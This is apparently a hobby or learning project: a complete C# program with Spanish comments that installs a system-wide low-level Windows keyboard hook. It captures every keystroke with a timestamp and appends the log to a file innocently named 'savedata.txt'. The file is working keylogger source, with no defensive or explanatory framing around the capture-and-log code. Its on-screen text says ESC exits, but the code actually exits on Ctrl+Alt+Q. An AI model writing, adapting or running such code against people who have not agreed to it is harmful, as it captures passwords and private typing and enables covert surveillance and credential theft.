using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Diagnostics.Contracts;
using System.IO;                   
using System.Runtime.InteropServices;


class Program
{
    // 1. Constantes de la API de Windows
    private const int WH_KEYBOARD_LL = 13;   // Hook de teclado de bajo nivel
    private const int WM_KEYDOWN = 0x0100; 
    private const int WM_KEYUP = 0x0101; 
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int WM_SYSKEYUP = 0x0105;
    private const int VK_SHIFT = 0x10;
    private const int VK_CAPITAL = 0x14;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static IntPtr _hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static List<KeyEvent> _historial = new List<KeyEvent>();
    private static bool  _shiftPresionado = false;
    private static readonly string _rutaArchivo = Path.Combine(
        AppDomain.CurrentDomain.BaseDirectory, 
        "savedata.txt");
    private static int _teclasDesdeUltimoVolcado = 0;
    private const int TECLAS_POR_VOLCADO = 5;
    
    private static readonly Dictionary<int, string> _teclasEspeciales = new Dictionary<int, string>
    {
        { 8,   "Backspace" },
        { 9,   "Tab" },
        { 13,  "Enter" },
        { 16,  "Shift" },
        { 17,  "Ctrl" },
        { 18,  "Alt" },
        { 19,  "Pause" },
        { 20,  "CapsLock" },
        { 27,  "Esc" },
        { 32,  "Espacio" },
        { 33,  "PageUp" },
        { 34,  "PageDown" },
        { 35,  "End" },
        { 36,  "Home" },
        { 37,  "Izquierda" },
        { 38,  "Arriba" },
        { 39,  "Derecha" },
        { 40,  "Abajo" },
        { 44,  "PrintScreen" },
        { 45,  "Insert" },
        { 46,  "Supr" },
        { 91,  "WinIzq" },
        { 92,  "WinDer" },
        { 93,  "Menu" },
        { 144, "NumLock" },
        { 145, "ScrollLock" },
        { 160, "ShiftIzq" },
        { 161, "ShiftDer" },
        { 162, "CtrlIzq" },
        { 163, "CtrlDer" },
        { 164, "AltIzq" },
        { 165, "AltDer" },
    };

    private class KeyEvent
    {
        public int Vkcode;
        public string Nombre;
        public DateTime Timestamp;
        public bool ShiftActivo;
        public bool CapsActivo;

        public override string ToString()
        {
            return $"[{Timestamp:HH:mm:ss.fff}] {Nombre} " +
                   $"(vk={Vkcode}, shift={ShiftActivo}, caps={CapsActivo})";
        }
    }

    static void Main()
    {
        AppDomain.CurrentDomain.ProcessExit += (s, e) => VolcarAArchivo(mostrarEnConsola: false);
        Console.WriteLine($"Ruta del archivo: {_rutaArchivo}");
        _hookID = SetHook(_proc);
        Console.WriteLine("Monitor activo. Presiona ESC para salir.");
        Console.WriteLine("Las teclas aparecerán aquí abajo:");
        Console.WriteLine("-----------------------------------");

        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0)
        {
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }

        UnhookWindowsHookEx(_hookID);

        VolcarAArchivo(mostrarEnConsola: true); 

        Console.WriteLine("Historial de captura");
        foreach (var ev in _historial)
        {
            Console.WriteLine(ev);
        }
    }


    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }


    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            int mensaje = (int)wParam;

            bool esDown = mensaje == WM_KEYDOWN || mensaje == WM_SYSKEYDOWN;
            bool esUp = mensaje == WM_KEYUP || mensaje == WM_SYSKEYUP;

            if (vkCode == 160 || vkCode == 161 || vkCode == VK_SHIFT)
            {
                if (esDown){
                    _shiftPresionado = true;
                } else if (esUp)
                {
                    _shiftPresionado = false;
                } 
            }

            if (esDown)
            {
                bool capsActivo = (GetKeyState(VK_CAPITAL) & 0x0001) !=0;

                string nombre = TraducirTecla(vkCode, _shiftPresionado, capsActivo);

                var ev = new KeyEvent
                {
                    Vkcode = vkCode,
                    Nombre = nombre,
                    Timestamp = DateTime.Now,
                    ShiftActivo = _shiftPresionado,
                    CapsActivo = capsActivo
                };
               
                _historial.Add(ev);
                _teclasDesdeUltimoVolcado++;
                
                if (_teclasDesdeUltimoVolcado >= TECLAS_POR_VOLCADO)
                {
                    VolcarAArchivo(mostrarEnConsola: false);
                    _teclasDesdeUltimoVolcado = 0;
                }
                Console.WriteLine(ev);

                if (vkCode == 81) // 'Q'
                {
                    bool ctrl = (GetKeyState(0x11) & 0x8000) != 0;  // VK_CONTROL
                    bool alt = (GetKeyState(0x12) & 0x8000) != 0;   // VK_MENU (Alt)
                    if (ctrl && alt)
                    {
                        VolcarAArchivo(mostrarEnConsola: false);
                        PostQuitMessage(0);
                    }
                }
            }
        }
        //     Si no llamas a esto, rompes el teclado del sistema
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static string TraducirTecla(int vkCode, bool shift, bool caps)
    {
        if(_teclasEspeciales.TryGetValue(vkCode, out string especial))
            return especial;
        
        if (vkCode >= 65 && vkCode <= 90)
        {
            char letra = (char)vkCode;
            bool mayuscula = shift ^ caps;
            return mayuscula ? letra.ToString() : letra.ToString().ToLower();
        }

        if (vkCode >= 48 && vkCode <= 57)
        {
            if (shift)
            {
                string simbolos = ")!@#$%^&*(";
                return simbolos[vkCode - 48].ToString();
            }

            return ((char)vkCode).ToString();
        }

        if (vkCode >= 112 && vkCode <= 135)
        {
            return $"F{vkCode - 111}";
        }

        uint scanCode = MapVirtualKey((uint)vkCode, 0);
        if (scanCode != 0)
            return $"ScanCode_{scanCode}";
        
        return $"Desconocida({vkCode})";
    }

    private static void VolcarAArchivo(bool mostrarEnConsola)
    {
        if(_historial.Count == 0) return;

        try
        {
            if (!File.Exists(_rutaArchivo))
            {
                File.WriteAllText(_rutaArchivo,$"Historial de teclas \nInicio: {DateTime.Now}\n\n");
            }

            using (StreamWriter sw = File.AppendText(_rutaArchivo))
            {
                foreach(var ev in _historial)
                    sw.WriteLine(ev.ToString());
            }

            if(mostrarEnConsola)
                Console.WriteLine($"\n[Volcado] {_historial.Count} teclas guardadas en {_rutaArchivo}");
        
            _historial.Clear();
        }
        catch(Exception ex)
        {
            Console.WriteLine($"[Error al escribir archivo] {ex.Message}");
        }
    }


    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);


    [DllImport("user32.dll")]
    private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

    [DllImport("user32.dll")]
    private static extern bool TranslateMessage(ref MSG lpMsg);

    [DllImport("user32.dll")]
    private static extern IntPtr DispatchMessage(ref MSG lpMsg);

    [DllImport("user32.dll")]
    private static extern void PostQuitMessage(int nExitCode);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int nVirtKet);

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG
    {
        public IntPtr hwnd;
        public uint message;
        public IntPtr wParam;
        public IntPtr lParam;
        public uint time;
        public int pt_x;
        public int pt_y;
    }
}